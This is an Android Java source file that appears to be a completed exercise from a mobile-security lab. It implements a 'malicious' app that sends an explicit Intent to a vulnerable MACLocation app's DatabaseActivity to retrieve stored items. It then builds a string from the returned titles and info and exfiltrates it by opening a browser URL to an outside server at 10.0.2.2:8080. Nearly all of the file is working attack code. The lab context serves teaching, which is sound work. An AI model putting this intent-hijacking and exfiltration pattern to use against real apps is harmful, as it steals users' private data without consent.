package lbs.lab.macintent;

import android.content.ClipData;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import androidx.appcompat.app.AppCompatActivity;

import android.util.Log;
import android.view.View;

import java.util.ArrayList;

import lbs.lab.maclocation.Item;

// ************************************************************
// ** Read and edit this file *********************************
// ************************************************************

/**
 * Activity that should get data via an Intent, then exfiltrate it through the browser.
 */
public class MainActivity extends AppCompatActivity {

    // unique code for the request Intent
    private static final int CODE = 6;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
    }

    /**
     * This function is called when the button is clicked, and should start the process
     * of exploiting the vulnerable MACLocation application through an Intent.
     *
     * @param view - the button clicked
     */
    public void act(View view) {
        // TODO
        Intent i = new Intent();

        i.setClassName("lbs.lab.maclocation", "lbs.lab.maclocation.DatabaseActivity");
        i.setType("lbs.lab.maclocation.DatabaseActivity");
        i.putExtra("ITEM_ACTION", "GET_ITEMS_ACTION");

        startActivityForResult(i, CODE);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        // once the MACLocation Activity has received the intent in act()
        // we have to handle the data we receive back
        // do this in the same way we exfiltrated data before
        // TODO

        String serverUrl = "http://10.0.2.2:8080/receive?data=";
        if (requestCode == CODE && resultCode == RESULT_OK && data != null) {
            try {
                // Get list of items from the returned Intent
                ArrayList<Item> items = data.getParcelableArrayListExtra("ITEMS_GET");

                if (items != null && !items.isEmpty()) {
                    // Build a string from the items
                    StringBuilder result = new StringBuilder();
                    result.append("\n");
                    for (Item item : items) {
                        result.append(item.getTitle()).append(" | ").append(item.getInfo()).append("\n");
                    }

                    // Encode the data for sending
                    String encoded = Uri.encode(result.toString());
                    String url = serverUrl + encoded;

                    // Create & start browser intent to send the data
                    Intent exfilIntent = new Intent(Intent.ACTION_VIEW);
                    exfilIntent.setData(Uri.parse(url));
                    startActivity(exfilIntent);

                    // Show what was exfiltrated in the logs
                    Log.d("MaliciousApp", "Exfiltrated data:\n" + result.toString());
                } else {
                    Log.d("MaliciousApp", "No items returned or list is empty.");
                }

            } catch (Exception e) {
                Log.e("MaliciousApp", "Error processing result: " + e.getMessage());
                e.printStackTrace();
            }
        }

        // Call super
        super.onActivityResult(requestCode, resultCode, data);
    }
}
